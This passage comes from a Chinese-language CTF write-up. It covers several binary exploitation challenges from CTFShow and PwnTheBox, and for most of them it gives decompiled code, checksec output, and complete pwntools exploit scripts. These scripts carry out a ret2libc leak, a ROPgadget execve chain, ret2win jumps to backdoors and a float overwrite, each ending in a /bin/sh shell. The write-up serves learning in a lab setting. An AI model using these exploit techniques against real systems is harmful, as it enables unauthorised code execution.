在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。

![](https://paper.tanyaodan.com/CTFShow/1024_happy_checkin/2.png)

在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`和`pop_ret`的地址。

```bash
ROPgadget --binary ./1024_happy_checkin --only "pop|ret"
```

![](https://paper.tanyaodan.com/CTFShow/1024_happy_checkin/3.png)

编写`Python`代码即可得到`ctfshow{851446cc-4ff9-4a2b-945d-f901ca234ba8}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('pwn.challenge.ctf.show', 28107)
e = ELF('./1024_happy_checkin')
pop_rdi = 0x4006e3 # ROPgadget --binary ./1024_happy_checkin --only "pop|ret"
puts_plt = e.plt['puts']
info('puts_plt => 0x%x', puts_plt)
puts_got = e.got['puts']
info('puts_got => 0x%x', puts_got)
main_address = e.symbols['main']
info('main_address => 0x%x', main_address)
payload = b'a'*0x370 + b'pwn1024!' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_address)
io.sendlineafter(b'welcome_to_ctfshow_1024_cup,input_your_ticket\n', payload)
io.recvline()
puts_address = u64(io.recv(6).ljust(8, b'\x00'))
libc = LibcSearcher('puts', puts_address) # libc版本, libc6_2.27-0ubuntu3_amd64 or libc6_2.27-3ubuntu1_amd64
pop_ret = 0x4004c6 # ROPgadget --binary ./1024_happy_checkin --only "pop|ret"
libcbase = puts_address - libc.dump('puts')
log.success('libcbase_address => %s', hex(libcbase))
system_address = libcbase + libc.dump('system')
info('system_address => 0x%x', system_address)
bin_sh_address = libcbase + libc.dump('str_bin_sh')
info('bin_sh_address => 0x%x', bin_sh_address)
payload = b'a'*0x370 + b'pwn1024!' + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFShow/1024_happy_checkin/4.png)

------

### 烧烤摊儿

先`file ./shaokao`查看文件类型再`checksec --file=./shaokao`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf]
└─$ file ./shaokao                         
./shaokao: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=2867805c3d477c70c169e3106f70255b7b4e8ffa, for GNU/Linux 3.2.0, not stripped
                                                                   
┌──(tyd㉿kali-linux)-[~/ctf]
└─$ checksec --file=./shaokao
[*] '/home/tyd/ctf/shaokao'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

使用`IDA pro 64bit`打开附件`shaokao`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // edx
  int v4; // ecx
  int v5; // er8
  int v6; // er9
  int result; // eax
  unsigned int v8; // [rsp+Ch] [rbp-4h]

  welcome(argc, argv, envp);
  v8 = menu();
  if ( v8 <= 5 )
    __asm { jmp     rax }
  printf((unsigned int)&unk_4B7008, (_DWORD)argv, v3, v4, v5, v6);
  exit(0LL);
  return result;
}
```

先来分析`menu()`函数。

```c
__int64 __fastcall menu(__int64 a1, __int64 a2, int a3, int a4, int a5, int a6)
{
  int v6; // edx
  int v7; // ecx
  int v8; // er8
  int v9; // er9
  unsigned int v11; // [rsp+Ch] [rbp-4h] BYREF

  printf((unsigned int)&unk_4B7040, (unsigned int)&name, a3, a4, a5, a6);  // 欢迎来到大金烧烤摊儿，来点啥？
  puts(&unk_4B706B);  // 1.啤酒
  puts(&unk_4B7075);  // 2.烤串
  puts(&unk_4B707F);  // 3.钱包余额
  puts(&unk_4B708F);  // 4.承包摊位
  if ( own )
    puts(&unk_4B709F);  // 5.改名
  puts(&unk_4B70A9);  // 0.离开
  putchar(62LL);
  putchar(32LL);
  _isoc99_scanf((unsigned int)&unk_4B70B3, (unsigned int)&v11, v6, v7, v8, v9);
  return v11;
}
```

接着分析`pijiu()`函数，发现判断语句`if(10 * v9 >= money)`存在整数溢出漏洞，我们可以通过输入一个负数来进入`else`实现`money`的增加。`chuan()`函数也存在这个整数溢出漏洞，但是加的钱没`pijiu()`函数加的多。

```c
__int64 pijiu()
{
  int v0; // edx
  int v1; // ecx
  int v2; // er8
  int v3; // er9
  int v4; // edx
  int v5; // ecx
  int v6; // er8
  int v7; // er9
  int v9; // [rsp+8h] [rbp-8h] BYREF
  int v10; // [rsp+Ch] [rbp-4h] BYREF

  v10 = 1;
  v9 = 1;
  puts(&unk_4B70B6);   // 1.青岛啤酒
  puts(&unk_4B70C6);   // 2.燕京U8
  puts(&unk_4B70D2);   // 3.勇闯天涯
  _isoc99_scanf((unsigned int)&unk_4B70B3, (unsigned int)&v10, v0, v1, v2, v3);
  puts(&unk_4B70E2);   // 来几瓶？
  _isoc99_scanf((unsigned int)&unk_4B70B3, (unsigned int)&v9, v4, v5, v6, v7);
  if ( 10 * v9 >= money )
    puts(&unk_4B70EF);  // 诶哟，钱不够了
  else
    money += -10 * v9;
  puts(&unk_4B7105);   // 咕噜咕噜...
  return 0LL;
}
```

分析`vip()`函数，可以看到当变量`money`的值大于`100000`时，变量`own`会置为`1`，此时我们就拥有烧烤摊啦。

```c
__int64 vip()
{
  puts(&unk_4B7180);  // 老板，你这摊儿，我买了
  if ( money <= 100000 )
  {
    puts(&unk_4B71A9);  // 没钱别瞎捣乱
  }
  else
  {
    money -= 100000;
    own = 1;
    puts(&unk_4B71A2);  // 成交
  }
  return 0LL;
}
```

拥有烧烤摊后，我们可以输入`5`对烧烤摊进行改名，分析`gaiming()`函数，`scanf()`函数并不能对输入长度进行限制，显然存在栈溢出漏洞，我们只需要用`0x28`个字节即可覆盖到栈帧。

```c
__int64 gaiming()
{
  int v0; // edx
  int v1; // ecx
  int v2; // er8
  int v3; // er9
  char v5[32]; // [rsp+0h] [rbp-20h] BYREF

  puts(&unk_4B71C0);  // 烧烤摊儿已归你所有，请赐名：
  _isoc99_scanf((unsigned int)&unk_4B71EB, (unsigned int)v5, v0, v1, v2, v3);
  j_strcpy_ifunc(&name, v5);
  return 0LL;
}
```

构造ROP链时，我们可以借助工具来生成ROP链。

```bash
ROPgadget --binary ./shaokao --ropchain
```

编写`Python`代码求解，获得`shell`后输入`cat flag`得到`ctfshow{739bccb2-d1ce-4d0c-b16b-5e5e953b6ed0}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('pwn.challenge.ctf.show', 28103)
io.sendlineafter('>', b'1')
sleep(1)
io.sendline(b'1')
sleep(1)
io.sendline(b'-10000')
io.sendlineafter('>', b'4')
io.sendlineafter('>', b'5')
# ROPgadget --binary ./shaokao --ropchain
p = b''
p += p64(0x000000000040a67e) # pop rsi ; ret
p += p64(0x00000000004e60e0) # @ .data
p += p64(0x0000000000458827) # pop rax ; ret
p += b'/bin//sh'
p += p64(0x000000000045af95) # mov qword ptr [rsi], rax ; ret
p += p64(0x000000000040a67e) # pop rsi ; ret
p += p64(0x00000000004e60e8) # @ .data + 8
p += p64(0x0000000000447339) # xor rax, rax ; ret
p += p64(0x000000000045af95) # mov qword ptr [rsi], rax ; ret
p += p64(0x000000000040264f) # pop rdi ; ret
p += p64(0x00000000004e60e0) # @ .data
p += p64(0x000000000040a67e) # pop rsi ; ret
p += p64(0x00000000004e60e8) # @ .data + 8
p += p64(0x00000000004a404b) # pop rdx ; pop rbx ; ret
p += p64(0x00000000004e60e8) # @ .data + 8
p += p64(0x4141414141414141) # padding
p += p64(0x0000000000447339) # xor rax, rax ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000402404) # syscall

payload = b'a'*0x28+p
io.sendline(payload)
io.interactive()
```

------

## PwnTheBox

### [others shellcode](https://ce.pwnthebox.com/challenges?id=476)

先`file ./wustctf2020_number_game  `查看文件类型，再`checksec --file=./wustctf2020_number_game  `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./shell_asm                                                                         
./shell_asm: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c1e8d8e26946c6b08794abdad991e3909e1bdc7f, not stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./shell_asm                                                    
[*] '/home/tyd/ctf/pwn/pwnthebox/shell_asm'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

使用`IDA pro 32bit`打开附件`wustctf2020_number_game`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  getShell();
  return 0;
}
```

双击`getShell()`函数查看详情：

```c
int getShell()
{
  int result; // eax
  char v1[9]; // [esp-Ch] [ebp-Ch] BYREF

  strcpy(v1, "/bin//sh");
  result = 11;
  __asm { int     80h; LINUX - sys_execve }
  return result;
}
```

直接`nc redirect.do-not-trust.hacking.run 10131`进靶机，`cat flag`拿到`PTB{4dc758b3-31e2-434d-af1a-bfc082c51671}`。当然也可以用`pwntools`练习，编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10131`，发送`payload`即可得到`PTB{4dc758b3-31e2-434d-af1a-bfc082c51671}`，提交即可。

```python
from pwn import *

io = remote('redirect.do-not-trust.hacking.run', 10131)
io.sendline(b'cat flag')
io.interactive()
```

------

### [tutorial1](https://ce.pwnthebox.com/challenges?type=4&id=948)

先`file ./tutorial1`查看文件类型再`checksec --file=./tutorial1`检查了一下文件保护情况。

使用`IDA pro 64bit`打开附件`tutorial1`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int buf; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts("   _  __       ____  _       __ ");
  puts("  | |/ /____  / __ \\(_)___  / /_");
  puts("  |   // __ \\/ / / / / __ \\/ __/");
  puts("  /   |/ /_/ / /_/ / / / / / /_ ");
  puts(" /_/|_/ .___/\\____/_/_/ /_/\\__/  ");
  puts("     /_/                         ");
  puts("Welcome, freshman!");
  puts("This is your first pwn challenge, right?");
  puts("Try to get into backdoor!");
  puts("Tell me your secret number:");
  read(0, &buf, 4uLL);
  if ( buf == -1162167622 ) // 0BABABABAh
    backdoor();
  else
    puts("Well, you don't know the trick yet?");
  return 0;
}
```

当用户输入的`buf`变量为`0xbabababa`时会执行`backdoor()`函数，双击`backdoor()`函数查看详情，可以看到函数返回值直接是`system("/bin/sh")`。

```c
int backdoor()
{
  puts("Well done! Go get your flag!");
  return system("/bin/sh");
}
```

编写`Python`代码获取靶机的`shell`权限，`cat flag`拿到本题`flag`，提交`PTB{073e2a21-2013-44e8-992b-549d973b333c}`即可。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10134)
io.sendlineafter(b':', p64(0xbabababa))
io.interactive()
```

![](https://paper.tanyaodan.com/PwnTheBox/948/1.png)

------

### [tutorial2](https://ce.pwnthebox.com/challenges?type=4&id=949)

先`file ./tutorial2`查看文件类型再`checksec --file=./tutorial2`检查了一下文件保护情况。

使用`IDA pro 64bit`打开附件`tutorial2`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void (*v4)(void); // [rsp+8h] [rbp-18h] BYREF
  int buf; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts("'##::::'##:'########::::'#####:::'####:'##::: ##:'########:");
  puts(". ##::'##:: ##.... ##::'##.. ##::. ##:: ###:: ##:... ##..::");
  puts(":. ##'##::: ##:::: ##:'##:::: ##:: ##:: ####: ##:::: ##::::");
  puts("::. ###:::: ########:: ##:::: ##:: ##:: ## ## ##:::: ##::::");
  puts(":: ## ##::: ##.....::: ##:::: ##:: ##:: ##. ####:::: ##::::");
  puts(": ##:. ##:: ##::::::::. ##:: ##::: ##:: ##:. ###:::: ##::::");
  puts(" ##:::. ##: ##:::::::::. #####:::'####: ##::. ##:::: ##::::");
  puts("..:::::..::..:::::::::::.....::::....::..::::..:::::..:::::");
  puts("Let's try something cooler!");
  puts("Tell me your secret number again:");
  read(0, &buf, 4uLL);
  if ( buf == -559038737 )  //0DEADBEEFh
  {
    puts("Oh, where to go?");
    read(0, &v4, 4uLL);
    v4();
  }
  else
  {
    puts("Well, you don't know the trick yet?");
  }
  return 0;
}
```

当用户输入的`buf`变量为`0xdeadbeef`时会输出`where to go?`语句，并执行用户输入的地址所存放的函数。在`Functions window`中有一个起始地址为`0x4006E6`的`backdoor()`函数，双击`backdoor()`函数查看详情，可以看到函数返回值直接是`system("/bin/sh")`。

```c
int backdoor()
{
  puts("Well done! Go get your flag!");
  return system("/bin/sh");
}
```

编写`Python`代码获取靶机的`shell`权限，`cat flag`拿到本题`flag`，提交`PTB{ede6ccfd-7923-41a1-8f6c-3066b1ba1bb2}`即可。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10133)
e = ELF('./tutorial2')
io.recvuntil(':')
io.send(p32(0xdeadbeef))
backdoor = e.symbols['backdoor'] # 0x4006e6
io.recvuntil('?')
io.send(p64(backdoor))
io.interactive()
```

![](https://paper.tanyaodan.com/PwnTheBox/949/1.png)

------

### [pwn1](https://ce.pwnthebox.com/challenges?type=4&id=365)

先`file ./pwn1_sctf_2016`查看文件类型再`checksec --file=pwn1_sctf_2016`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/1.png)

用`IDA Pro 32bit`打开`pwn1_sctf_2016`后按`F5`反汇编源码并查看主函数，发现`vuln()`函数。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/2.png)

双击`vuln()`函数查看源码，分析后发现`fgets()`函数限制输入`32`个字节到变量`s`中，乍一看并没有超出可用栈大小。但是审计代码时会发现第`19`行的`replace()`函数会把输入的`I`替换成`you`，`1`个字符变成`3`个字符，并且在第`27`行会对原来的`s`变量重新赋值。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/4.png)

在`Functions window`可以看到有一个`get_flag()`函数，按`F5`反汇编可以看到这是一个系统调用，且`get_flag()`函数的起始地址为`0x8048F0D`。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/5.png)

查看栈结构发现`s`的长度为`0x3c`，即`60`个字节，而输入被限制在`32`个字节内，每个`I`可以被替换成`you`，所以输入`60÷3=20`个`I`就能让栈溢出，然后`db 4 dup(?)` 还需要占用`4`个字节的内存，最后加上`get_flag()`函数的起始地址`0x8048F0D`构成`payload`。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/6.png)

编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10356`，发送`payload`即可得到`PTB{9ecbaa04-d23f-4d99-a1e0-6b9d8f6a5211}`。

```python
from pwn import *

io = remote('redirect.do-not-trust.hacking.run', 10356)
e = ELF('pwn1_sctf_2016')
address = e.symbols['get_flag']
log.success('get_flag_address => %s' % hex(address).upper())
payload = b'I'*20 + b'a'*0x4 + p32(address)
# payload = b'I'*20 + b'a'*0x4 + p32(0x8048F0D)
io.sendline(payload)
io.interactive()
```

------

### [getshell](https://ce.pwnthebox.com/challenges?type=4&id=1773)

先`file ./wustctf2020_getshell`查看文件类型再`checksec --file=./wustctf2020_getshell`检查了一下文件保护情况。

使用`IDA pro 32bit`打开附件`wustctf2020_getshell`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  vulnerable();
  return 0;
}
```

双击`vulnerable()`函数查看详情，发现有个`char`型数组变量`buf`，`buf`的长度只有`0x18`，但是`gets()`函数读取输入到变量`buf`时限制输入的大小是`0x20`，显然存在栈溢出漏洞。

```c
ssize_t vulnerable()
{
  char buf[24]; // [esp+0h] [ebp-18h] BYREF

  return read(0, buf, 0x20u);
}
```

此外在`Functions window`中还能看到`shell`函数，起始地址为`0x804851B`，查看`shell`函数发现返回值直接是`system("/bin/sh")`。

```c
int shell()
{
  return system("/bin/sh");
}
```

构造`Payload`时先用`0x18`个字节占满`buf`变量，再用`4`个字节覆盖到栈帧，接着再加上`shell`函数的地址以调用靶机的`shell`脚本。

编写`Python`代码获取靶机的`shell`权限，`cat flag`拿到本题`flag`，提交`PTB{c0d1c12f-9600-4e2a-a12b-426ba9e63083}`即可。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10267)
e = ELF('./wustctf2020_getshell')
shell = e.symbols['shell'] # 0x804851B
log.success('shell_address => %s'%hex(shell))
payload = b'a'*0x18 + b'pwn!' + p32(shell)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/PwnTheBox/1773/1.png)

------

### [getshell2](https://ce.pwnthebox.com/challenges?id=1775)

先`file ./wustctf2020_getshell_2`查看文件类型再`checksec --file=./wustctf2020_getshell_2`检查了一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./wustctf2020_getshell_2
./wustctf2020_getshell_2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=04705198080d6fab73e387726630da78421bd6d0, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./wustctf2020_getshell_2
[*] '/home/tyd/ctf/pwn/pwnthebox/wustctf2020_getshell_2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

使用`IDA pro 32bit`打开附件`wustctf2020_getshell_2`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  vulnerable();
  return 0;
}
```

双击`vulnerable()`函数查看详情，发现有个`char`型数组变量`buf`，`buf`的长度只有`0x18`，但是`gets()`函数读取输入到变量`buf`时限制输入的大小是`0x24`，显然存在栈溢出漏洞。

```c
ssize_t vulnerable()
{
  char buf[24]; // [esp+0h] [ebp-18h] BYREF

  return read(0, buf, 0x24u);
}
```

和上题 [getshell](#getshell) 不同的是，`Functions window`中的`shell`函数并不能直接用了。

```c
int shell()
{
  return system("/bbbbbbbbin_what_the_f?ck__--??/sh");
}
```

我们可以选取有用的信息，在`shell`函数的汇编代码中可以看到`call _system`的地址为`0x8048529`。

```assembly
.text:0804851B                 public shell
.text:0804851B shell           proc near
.text:0804851B ; __unwind {
.text:0804851B                 push    ebp
.text:0804851C                 mov     ebp, esp
.text:0804851E                 sub     esp, 8
.text:08048521                 sub     esp, 0Ch
.text:08048524                 push    offset command  ; "/bbbbbbbbin_what_the_f?ck__--??/sh"
.text:08048529                 call    _system
.text:0804852E                 add     esp, 10h
.text:08048531                 nop
.text:08048532                 leave
.text:08048533                 retn
.text:08048533 ; } // starts at 804851B
.text:08048533 shell           endp
```

使用`ROPgadget`能获取到字符串`"sh"`的地址为`0x8048670`。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ ROPgadget --binary ./wustctf2020_getshell_2 --string "sh"
Strings information
============================================================
0x08048670 : sh
```

编写`Python`代码求解得到`PTB{1adb36f3-5905-4ed4-8b05-52a0affd97a5}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10256)
elf = ELF('./wustctf2020_getshell_2')
call_system = 0x8048529
sh_addr = 0x8048670
payload = b'a'*(0x18+0x4) + p32(call_system) + p32(sh_addr)
io.sendline(payload)
io.interactive()
```

------

### [ciscn_2019_n_1](https://ce.pwnthebox.com/challenges?type=4&id=524)

先`file ./ciscn_2019_n_1`查看文件类型再`checksec --file=ciscn_2019_n_1`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/1.png)

用`IDA Pro 64bit`打开`ciscn_2019_n_1`后按`F5`反汇编源码并查看主函数，发现`fun()`函数最可疑。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/2.png)

双击`func()`函数查看源码可以看到当`v2 = 11.28125`时会有一个系统调用。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/3.png)

查看汇编代码双击`cs:dword_4007F4`可以看到`11.28125`在内存中的`16`进制表示为`0x41348000`。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/4.png)

查看栈结构，此处`var_30`是`v1`，而`var_4`是`v2`，需要`(0x30-0x04)=44`个字节就能让栈溢出，最后再填入`11.28125`对应的十六进制数`0x41348000`。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/5.png)

编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10406`，发送`payload`即可得到`PTB{7a857dc1-60e5-41a8-b615-3dd418407a0a}`。

```python
from pwn import *

io = remote('redirect.do-not-trust.hacking.run', 10406)
payload = b'a'*(0x30 - 0x4) + p64(0x41348000)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/PwnTheBox/524/1.png)

------

### [Easyheap](https://ce.pwnthebox.com/challenges?type=4&id=1387)

先`file ./easyheap `查看文件类型，再`checksec --file=./easyheap `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./easyheap            
./easyheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=474c468173fd4e4bf36f20820d6fc2c3b5abed7a, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./easyheap 
[*] '/home/tyd/ctf/pwn/pwnthebox/easyheap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开`easyheap`后按`F5`反汇编源码并查看主函数。

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf[8]; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, buf, 8uLL);
      v3 = atoi(buf);
      if ( v3 != 3 )
        break;
      delete_heap();
    }
    if ( v3 > 3 )
    {
      if ( v3 == 4 )
        exit(0);
      if ( v3 == 4869 )
      {
        if ( (unsigned __int64)magic <= 0x1305 )
        {
          puts("So sad !");
        }
        else
        {
          puts("Congrt !");
          l33t();
        }
      }
      else
      {
LABEL_17:
        puts("Invalid Choice");
      }
    }
    else if ( v3 == 1 )
    {
      create_heap();
    }
    else
    {
      if ( v3 != 2 )
        goto LABEL_17;
      edit_heap();
    }
  }
}
```

双击`menu()`函数查看详情，发现该程序的功能如下：`1`创建堆，`2`修改堆，`3`删除堆。

```c
int menu()
{
  puts("--------------------------------");
  puts("       Easy Heap Creator       ");
  puts("--------------------------------");
  puts(" 1. Create a Heap               ");
  puts(" 2. Edit a Heap                 ");
  puts(" 3. Delete a Heap               ");
  puts(" 4. Exit                        ");
  puts("--------------------------------");
  return printf("Your choice :");
}
```

双击`create_heap()`函数查看详情，发现最多创建`10`个`chunk`，`heaparray[i]`用来存放`chunk`的地址，`heaparray`是存放在`.bss`段上的，`read_input(heaparray[i], size);`用来向`chunk`中写入`size`大小的内容。

```c
unsigned __int64 create_heap()
{
  int i; // [rsp+4h] [rbp-1Ch]
  size_t size; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !*(&heaparray + i) )    // if(!heaparray[i])
    {
      printf("Size of Heap : ");
      read(0, buf, 8uLL);
      size = atoi(buf);
      *(&heaparray + i) = malloc(size);
      if ( !*(&heaparray + i) )
      {
        puts("Allocate Error");
        exit(2);
      }
      printf("Content of heap:");
      read_input(*(&heaparray + i), size);  // read_input(heaparray[i], size);
      puts("SuccessFul");
      return __readfsqword(0x28u) ^ v4;
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```

双击`edit_heap()`函数查看详情，`read_input(heaparray[v1], v2);`向`chunk`中写入`v2`大小的内容，如果`v2`比`create_heap()`中创建堆时的`size`更大的话就能形成堆溢出漏洞。

```c
unsigned __int64 edit_heap()
{
  int v1; // [rsp+4h] [rbp-1Ch]
  __int64 v2; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    printf("Size of Heap : ");
    read(0, buf, 8uLL);
    v2 = atoi(buf);
    printf("Content of heap : ");
    read_input(*(&heaparray + v1), v2);  // read_input(heaparray[v1], v2); 
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

